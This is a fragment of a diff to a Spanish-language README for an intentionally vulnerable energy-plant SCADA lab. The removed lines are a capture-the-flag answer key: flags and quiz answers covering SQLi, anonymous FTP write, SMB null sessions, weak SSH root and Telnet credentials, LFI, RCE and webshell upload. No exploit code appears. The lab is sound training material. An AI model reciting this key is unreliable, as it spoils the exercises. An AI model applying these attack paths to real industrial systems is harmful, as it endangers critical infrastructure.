-| 35 | Flag del panel SCADA comprometido por SQLi | `PLE{sqli_auth_bypass_scada_panel}` |
-| 36 | Flag publicada en FTP | `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}` |
-| 37 | Flag en share SMB de backups | `PLE{smb_null_s3ss10n_backup_exp0s3d}` |
-| 38 | Flag de enumeración SMTP | `PLE{smtp_vrfy_open_r3l4y_us3r_enum}` |
-| 39 | Flag del acceso SSH con root | `PLE{ssh_r00t_l0g1n_w34k_p4ss}` |
-| 40 | Flag del acceso TELNET | `PLE{telnet_pl41nt3xt_cr3ds_l34k}` |
-
-</details>
-
-<details>
-<summary>🧠 <strong>Extra</strong></summary>
-
-| # | Pregunta | Respuesta |
-|---|----------|-----------|
-| 41 | ¿Qué vulnerabilidad permite leer archivos arbitrarios via `include()`? | `LFI` |
-| 42 | ¿Qué vulnerabilidad permite ejecutar shell commands desde parámetro GET? | `RCE` |
-| 43 | ¿Qué dos servicios permiten lograr webshell por subida de archivos? | `FTP` y `SMB` |
-| 44 | ¿Qué archivo FTP contiene credenciales temporales del sistema? | `credenciales_sistemas.txt` |
-| 45 | ¿Qué usuario de aplicación reutiliza su nombre como contraseña? | `scada` |
-
-</details>
 
 ---
 
 <div align="center">
 
-**`Planta Energía Vulnerable Lab`** concentra múltiples clases de fallos reales en una sola cadena ofensiva coherente: fuga de secretos, servicios heredados, ejecución remota, credenciales débiles y compartición insegura entre servicios.
+**`Planta Energía Vulnerable Lab`** — practica recon multivector, explotación web manual, abuso de servicios legacy y explotación encadenada hacia shell.
 
 ![](https://img.shields.io/badge/FTP-Webshell-00ff88?style=flat-square)
 ![](https://img.shields.io/badge/SMB-Null%20Session-ff6b00?style=flat-square)
